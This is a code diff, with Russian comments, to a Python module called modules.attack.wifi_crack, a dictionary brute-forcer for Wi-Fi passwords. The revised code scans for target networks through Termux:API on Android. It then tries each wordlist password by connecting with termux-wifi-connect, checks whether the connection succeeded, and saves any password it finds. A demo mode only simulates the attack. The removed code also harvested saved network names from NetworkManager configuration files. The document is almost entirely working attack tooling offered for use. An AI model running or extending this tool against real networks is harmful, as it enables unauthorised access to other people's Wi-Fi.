@@ -13,8 +13,9 @@ modules.attack.wifi_crack — Подбор пароля от Wi-Fi.
   pn_h0001.txt   — цифры, hard pass (200k p)
   pn_ea_01.txt   — цифры + буквы
 
-Реальная проверка пароля требует модуля pywifi (работает на Android/Termux
-через WiAdapter). Если он недоступен, включается демо-режим симуляции.
+Список сетей-целей получается через Termux:API (`termux-wifi-scaninfo`).
+Реальная проверка пароля выполняется подключением к сети средствами Android
+(`termux-wifi-connect`); если Termux:API недоступен, включается демо-режим.
 """
 
 import os
@@ -46,54 +47,35 @@ def dict_path(fname):
 # ─────────────────── цели (список сетей) ───────────────────
 
 def _get_targets():
-    """Возвращает список доступных Wi-Fi сетей: [(ssid, secure), ...]."""
-    targets = []
-    try:
-        import pywifi
-        wifi = pywifi.PyWiFi()
-        iface = wifi.interfaces()[0]
-        iface.scan()
-        time.sleep(4)
-        for net in iface.scan_results():
-            if net.ssid and net.ssid not in [t[0] for t in targets]:
-                targets.append((net.ssid, bool(net.key_type)))
-        return targets
-    except Exception:
-        pass
-
-    # Fallback: вывод termux-wifi-scaninfo
+    """Возвращает список доступных Wi-Fi сетей через Termux:API:
+    [(ssid, secure), ...]."""
+    import json
+    import shutil as _sh
     import subprocess
+
+    if _sh.which("termux-wifi-scaninfo") is None:
+        return []
     try:
         out = subprocess.run(["termux-wifi-scaninfo"],
-                             capture_output=True, text=True, timeout=10).stdout
-        import json
+                             capture_output=True, text=True,
+                             timeout=15).stdout
         data = json.loads(out or "[]")
-        seen = set()
-        for net in data:
-            ssid = net.get("SSID") or net.get("ssid")
-            if ssid and ssid not in seen:
-                seen.add(ssid)
-                caps = str(net.get("Security", ""))
-                targets.append((ssid, "OPEN" not in caps.upper()))
-        if targets:
-            return targets
     except Exception:
-        pass
-
-    # Крайний вариант: известные сети из конфигурации ОС
-    try:
-        import glob
-        paths = glob.glob("/etc/NetworkManager/system-connections/*.nmconnection") \
-            + glob.glob("/etc/NetworkManager/system-connections/*.ini")
-        for p in paths:
-            with open(p, encoding="utf-8", errors="ignore") as f:
-                for line in f:
-                    if line.strip().startswith("ssid="):
-                        ssid = line.strip().split("=", 1)[-1]
-                        if ssid:
-                            targets.append((ssid, True))
-    except Exception:
-        pass
+        return []
+    if isinstance(data, dict):
+        data = [data]
+    targets, seen = [], set()
+    for net in data:
+        if not isinstance(net, dict):
+            continue
+        ssid = net.get("ssid") or net.get("SSID")
+        if not ssid or ssid in seen:
+            continue
+        seen.add(ssid)
+        caps = str(net.get("capabilities", "")).upper()
+        secure = ("WPA" in caps or "RSN" in caps or "WEP" in caps
+                  or "EAP" in caps)
+        targets.append((ssid, secure))
     return targets
 
 
@@ -155,35 +137,49 @@ def _choose_dictionary():
         print(f"{C.RED}  ✖ Неверный пункт.{C.RESET}")
 
 
-# ─────────────────── реальная атака через pywifi ───────────────────
+# ─────────────── реальная атака через Termux:API ───────────────
 
-def _try_connect(iface, ssid, pwd):
-    """Одна реальная попытка подключения с паролем pwd."""
-    import pywifi
-    profile = pywifi.Profile()
-    profile.ssid = ssid
-    profile.auth = pywifi.const.AUTH_ALG_OPEN
-    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
-    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
-    profile.key = pwd
+def _termux_connectable():
+    """Есть ли Termux:API для реальной проверки паролей."""
+    import shutil as _sh
+    return (_sh.which("termux-wifi-connect") is not None
+            and _sh.which("termux-wifi-info") is not None)
+
+
+def _try_connect(ssid, pwd):
+    """Одна реальная попытка подключения к сети с паролем pwd
+    через `termux-wifi-connect` (Termux:API)."""
+    import json
+    import subprocess
+
     try:
-        iface.remove_all_network_profiles()
-        tmp_profile = iface.add_network_profile(profile)
-        iface.connect(tmp_profile)
-        steps = max(1, int(DELAY * 10))
-        for _ in range(steps):  # короткое ожидание статуса
-            time.sleep(0.1)
-            if iface.status() == pywifi.const.IFACE_CONNECTED:
-                return True
-        iface.disconnect()
-        time.sleep(0.2)
-        return False
+        subprocess.run(["termux-wifi-connect", "--ssid", ssid,
+                        "--pwd", pwd, "--type", "wpa2"],
+                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
+                       text=True, timeout=15)
     except Exception:
-        try:
-            iface.disconnect()
-        except Exception:
-            pass
         return False
+    ok = False
+    steps = max(1, int(DELAY * 10))
+    for _ in range(steps):        # короткое ожидание статуса
+        time.sleep(0.1)
+        try:
+            out = subprocess.run(["termux-wifi-info"],
+                                 capture_output=True, text=True,
+                                 timeout=5).stdout
+            info = json.loads(out or "{}")
+        except Exception:
+            info = {}
+        if info.get("connected") and info.get("ssid") == ssid:
+            ok = True
+            break
+    try:                          # откат профиля, чтобы не остаться в сети
+        subprocess.run(["termux-wifi-forgetprofile", "--all"],
+                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
+                       text=True, timeout=10)
+    except Exception:
+        pass
+    return ok
 
 
 def _save_result(ssid, pwd, demo_note=False):
@@ -222,24 +218,21 @@ def run_attack(ssid, dict_path, demo=False):
     print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
     print(f"{C.DIM}  Ctrl+C — остановить подбор.{C.RESET}\n")
 
-    real_iface = None
+    real_mode = False
     if not demo:
-        try:
-            import pywifi
-            wifi = pywifi.PyWiFi()
-            real_iface = wifi.interfaces()[0]
-        except Exception:
-            real_iface = None
+        if _termux_connectable():
+            real_mode = True
+        else:
             demo = True
-            print(f"{C.YELLOW}  ⚠ pywifi недоступен — включён демо-режим.{C.RESET}\n")
+            print(f"{C.YELLOW}  ⚠ Termux:API недоступен — включён демо-режим.{C.RESET}\n")
 
     start = time.time()
     found = None
     try:
         for i, pwd in enumerate(passwords, 1):
             ok = False
-            if real_iface is not None:
-                ok = _try_connect(real_iface, ssid, pwd)
+            if real_mode:
+                ok = _try_connect(ssid, pwd)
             else:
                 # демо: имитируем проверку с шагом 0.5 сек
                 time.sleep(DELAY)
@@ -260,7 +253,7 @@ def run_attack(ssid, dict_path, demo=False):
                 break
 
             # задержка шага, если реальная проверка прошла быстрее
-            if real_iface is not None:
+            if real_mode:
                 target_time = start + i * DELAY
                 now = time.time()
                 if now < target_time:
@@ -272,10 +265,10 @@ def run_attack(ssid, dict_path, demo=False):
     if found:
         print(f"\n{C.GREEN}{C.BOLD}  ✔ ПАРОЛЬ НАЙДЕН: {found}{C.RESET}")
         _save_result(ssid, found)
-    elif real_iface is None:
+    elif not real_mode:
         print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
-              f"\n  Для боевого режима установите pywifi (pip install pywifi) и"
-              f"\n  запустите с правами, позволяющими менять Wi-Fi соединение.{C.RESET}")
+              f"\n  Для боевого режима установите Termux:API (pkg install termux-api"
+              f"\n  + приложение Termux:API из F-Droid).{C.RESET}")
         _save_result(ssid, None, demo_note=True)
     else:
         print(f"\n{C.RED}  ✖ Пароль не найден (словарь исчерпан).{C.RESET}")
